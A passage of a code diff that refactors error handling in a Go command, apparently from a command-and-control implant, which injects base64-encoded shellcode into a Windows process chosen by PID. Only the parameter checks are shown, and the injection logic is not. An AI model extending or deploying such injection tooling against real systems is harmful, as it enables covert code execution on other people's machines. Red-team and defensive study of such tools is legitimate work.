@@ -81,57 +81,33 @@ type VanillaInjectionParams struct {
 func (c *VanillaInjectionCommand) Execute(task structs.Task) structs.CommandResult {
 	// Ensure we're on Windows
 	if runtime.GOOS != "windows" {
-		return structs.CommandResult{
-			Output:    "Error: This command is only supported on Windows",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: This command is only supported on Windows")
 	}
 
 	// Parse parameters
 	var params VanillaInjectionParams
 	err := json.Unmarshal([]byte(task.Params), &params)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	// Validate parameters
 	if params.ShellcodeB64 == "" {
-		return structs.CommandResult{
-			Output:    "Error: No shellcode data provided",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: No shellcode data provided")
 	}
 
 	if params.PID <= 0 {
-		return structs.CommandResult{
-			Output:    "Error: Invalid PID specified",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: Invalid PID specified")
 	}
 
 	// Decode the base64-encoded shellcode
 	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding shellcode: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding shellcode: %v", err)
 	}
 
 	if len(shellcode) == 0 {
-		return structs.CommandResult{
-			Output:    "Error: Shellcode data is empty",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: Shellcode data is empty")
 	}
 
 	// Build output
